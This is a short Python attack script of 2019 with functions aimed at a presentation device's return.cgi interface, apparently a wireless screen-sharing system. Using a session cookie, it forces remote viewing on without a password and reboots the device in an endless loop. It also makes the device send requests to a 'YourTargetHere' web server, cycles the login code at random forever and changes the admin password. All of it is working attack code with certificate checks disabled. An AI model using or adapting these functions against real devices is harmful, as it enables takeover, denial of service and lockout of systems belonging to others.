#!/usr/bin/python3

#------------------------------------------------------------------------------------
#
#   Purpose: Individual Functions
#
#   Version: 1
#
#   Date: 9/24/2019
#
#-------------------------------------------------------------------------------------

import requests
import random
import urllib3

urllib3.disable_warnings()

def ToggleRemote(host, cookie):
    #Turn Remove View Off
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command":"<Send><seid>"+ cookie +"</seid><name>SLIDES_ALWAYS_SEND</name><value>1</value><name>SLIDES_PASSWORD</name><value>0</value><name>SLIDES_SECOND</name><value>0</value></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Remote View Active")

def Reboot(host, cookie, loop):
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command" :	"<Send><seid>" + cookie + "</seid><Factory>reboot</Factory></Send>"
    }
    reboot = requests.post(url=url,data=data, verify=False)
    while loop:
        reboot = requests.post(url=url,data=data, verify=False)

    print("Reboot Incoming")
def WebDos(host,cookie,WebServer):
    WebServer="YourTargetHere"
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command"	:"<Send><seid>" + cookie + "</seid><upload><protocol>http</protocol><address>" + WebServer + "</address><logo>TheWeb.png</logo></upload></Send>"
    }
    remoteViewOn = requests.post(url=url,data=data, verify=False)
    print("Web Request Sent")

def CodeCycle(host, cookie):
    while True:
            randomInt = random.randint(1,9999)
            url = "https://"+ host + "/cgi-bin/return.cgi"
            data = {
                'command' : '<Send><seid>' + cookie + '</seid><name>PREF_LOGINCODE</name><value>2</value><name>PREF_UNIVERSAL_LOGINCODE</name><value>' + str(randomInt) + '</value></Send>'
            }
            remoteViewOn = requests.post(url=url,data=data, verify=False)
            print("Cycle")

def ChangePass(host, cookie, newPass):
    url = "https://"+ host + "/cgi-bin/return.cgi"
    data = {
        "command"	:"<Send><seid>" + cookie + "</seid><name>LONG_ADMIN_PWD</name><value>" + newPass + "</value></Send>"
    }
    changePass = requests.post(url=url,data=data, verify=False)
    print("Password Change Request Sent")
